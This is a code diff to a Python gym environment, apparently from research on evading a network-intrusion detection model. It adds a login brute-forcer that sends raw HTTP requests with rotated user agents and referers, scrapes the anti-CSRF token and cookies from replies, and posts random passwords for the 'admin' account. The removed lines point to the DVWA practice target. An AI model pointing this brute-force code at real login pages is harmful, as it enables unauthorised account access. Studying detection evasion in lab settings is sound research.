@@ -1,4 +1,4 @@
-import gym, socket, pickle, os
+import gym, socket, pickle, os, random, string
 import numpy as np
 import os.path as osp
 
@@ -12,7 +12,7 @@ class DeEnv(gym.Env):
 
     metadata = {'render.modes': ['human']}
 
-    def __init__(self, iface, src_port, server, attack, obs_len, flow_std_file='data/flows/stats.pkl', model_dir='models', model_type='dnn'):
+    def __init__(self, iface, src_port, server, url, attack, obs_len, flow_std_file='data/flows/stats.pkl', model_dir='models', model_type='dnn'):
 
         super(DeEnv, self).__init__()
 
@@ -31,8 +31,8 @@ class DeEnv(gym.Env):
         self.xmin = stats[1]
         self.xmax = stats[2]
         self.target_model = self._load_model(model_dir, model_type)
+        self.url = url
         self.attack = attack
-        self.attack_payloads = []
 
         # actions: break, delay, pad, packet
 
@@ -44,7 +44,10 @@ class DeEnv(gym.Env):
 
     def step(self, action):
 
+        if self.attack == 'bruteforce':
+            pkt = self._generate_bruteforce_packet()
 
+        print(pkt)
 
         # observation
 
@@ -68,13 +71,15 @@ class DeEnv(gym.Env):
 
     def reset(self):
         self.pkt_list.clear()
-        self.attack_payloads = self._generate_attack_packets()
-        print(self.attack_payloads)
+        self._generate_user_agent()
+        self._generate_referer()
+        self.user_token = None
+        self.cookie = None
         self.t_start = time()
-        sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sckt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sckt.bind(('', self.port))
-        sckt.connect(self.remote)
+        self.sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sckt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sckt.bind(('', self.port))
+        self.sckt.connect(self.remote)
         while len(self.pkt_list) < 3:
             sleep(0.001)
         obs = self._get_obs()
@@ -102,8 +107,7 @@ class DeEnv(gym.Env):
                 break
         return obs
 
-    def _generate_http_headers(self):
-
+    def _generate_user_agent(self):
         user_agents = [
             'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
             'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
@@ -118,31 +122,60 @@ class DeEnv(gym.Env):
             'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
             'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
         ]
-        user_agent = np.random.choice(user_agents)
+        self.user_agent = np.random.choice(user_agents)
 
+    def _generate_referer(self):
         referers = [
             'http://www.google.com/?q=',
             'http://www.usatoday.com/search/results?q=',
             'http://engadget.search.aol.com/search?q='
         ]
-        referer = np.random.choice(referers)
+        self.referer = np.random.choice(referers)
 
-        header_list = [
-            'User-Agent: {0}'.format(user_agent),
-            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language: en-US,en;q=0.5',
-            'Accept-Encoding: gzip, deflate',
-            'Referer: {0}'.format(referer)
-        ]
-        headers = '\r\n'.join(header_list)
+    def _generate_bruteforce_packet(self):
+        if self.cookie == None or self.user_token == None:
+            packet_as_a_list = [
+                'GET {0} HTTP/1.1'.format(self.url),
+                'Host: {0}'.format(self.remote[0]),
+                'User-Agent: {0}'.format(self.user_agent),
+                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language: en-US,en;q=0.5',
+                'Accept-Encoding: gzip, deflate',
+                'Referer: {0}'.format(self.referer)
+            ]
+        else:
+            password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+            content = '\r\n\r\nusername=admin&password={0}&Login=Login&user_token={1}'.format(password, self.user_token)
+            packet_as_a_list = [
+                'POST {0} HTTP/1.1'.format(self.url),
+                'Host: {0}'.format(self.remote[0]),
+                'User-Agent: {0}'.format(self.user_agent),
+                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language: en-US,en;q=0.5',
+                'Accept-Encoding: gzip, deflate',
+                'Referer: {0}'.format(self.referer),
+                'Cookie: {0}'.format(self.cookie)
+            ]
+        return '\r\n'.join(packet_as_a_list)
 
-        return headers
 
-    def _generate_attack_packets(self):
-        headers = self._generate_http_headers()
-        if self.attack == 'bruteforce':
-            get_packet = 'GET /DVWA-master/login.php HTTP/1.1\r\nHost: {0}\r\n{1}\r\n\r\n'.format(self.remote[0], headers)
-            print(get_packet)
+    def _process_reply(self):
+        reply = self.sckt.recv(4096).decode('utf-8')
+        lines = reply.split('\r\n')
+        for line in lines:
+            if 'user_token' in line:
+                spl = line.split('value=')
+                user_token = spl[1].split('/>')[0][1:-2]
+        print('User token: {0}'.format(user_token))
+
+        cookie_list = []
+        spl = reply.split('Set-Cookie: ')
+        for item in spl[1:]:
+            cookie_value = item.split(';')[0]
+            if cookie_value not in cookie_list:
+                cookie_list.append(cookie_value)
+        cookie = ';'.join(cookie_list)
+        return user_token, cookie
 
     def _load_model(self, model_dir, prefix):
         model_score = 0
